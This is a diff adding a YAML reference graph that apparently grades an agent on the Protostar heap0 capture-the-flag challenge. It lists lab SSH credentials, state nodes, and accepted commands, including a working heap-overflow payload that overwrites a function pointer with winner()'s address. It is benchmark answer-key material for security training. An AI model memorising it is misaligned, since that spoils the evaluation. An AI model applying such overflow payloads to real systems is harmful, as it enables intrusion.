@@ -1,0 +1,95 @@
+version: '0.5'
+graph:
+  type: reference
+challenge:
+  id: protostar_heap0
+  name: Protostar Heap Zero
+  description: Overflow the first heap chunk so that the adjacent function pointer is replaced with winner().
+attacker_context:
+  user: user
+  access:
+    method: ssh
+    credentials:
+      username: user
+      password: user
+  target:
+    host: <target-hostname-or-ip>
+    port: 22
+goal:
+  node: node3
+irrelevant_commands:
+- pwd
+- id
+- whoami
+- clear
+- history
+- uname
+- hostname
+- man
+- strings
+- checksec
+- file
+- ls
+- ls -la
+- env
+- printenv
+nodes:
+- id: start
+  type: sentinel
+  label: Start
+- id: node0
+  type: state
+  label: winner() address recovered
+- id: node1
+  type: state
+  label: Distance from name to function pointer identified
+- id: node2
+  type: state
+  label: Heap-overflow payload built
+- id: node3
+  type: state
+  label: Function pointer redirected to winner()
+edges:
+- id: edge0
+  from: start
+  to: node0
+  action: recover_winner_symbol_address
+  accepted_commands:
+  - objdump -t /opt/protostar/bin/heap0 | grep " winner$"
+  - nm /opt/protostar/bin/heap0 | grep " winner$"
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*winner.*
+    stderr_regex: ^$
+- id: edge1
+  from: node0
+  to: node1
+  action: observe_heap_layout_distance
+  accepted_commands:
+  - /opt/protostar/bin/heap0 A
+  - gdb -q /opt/protostar/bin/heap0
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*data is at .* fp is at .*
+    stderr_regex: ^$
+- id: edge2
+  from: node1
+  to: node2
+  action: build_heap_overflow_payload
+  accepted_commands:
+  - python -c 'import struct; print "A"*72 + struct.pack("<I", 0x08048464)'
+  - perl -e 'print "A"x72 . pack("V", 0x08048464)'
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*
+    stderr_regex: ^$
+- id: edge3
+  from: node2
+  to: node3
+  action: trigger_winner_via_function_pointer
+  accepted_commands:
+  - /opt/protostar/bin/heap0 $(python -c 'import struct; print "A"*72 + struct.pack("<I", 0x08048464)')
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*level passed.*
+    stderr_regex: ^$
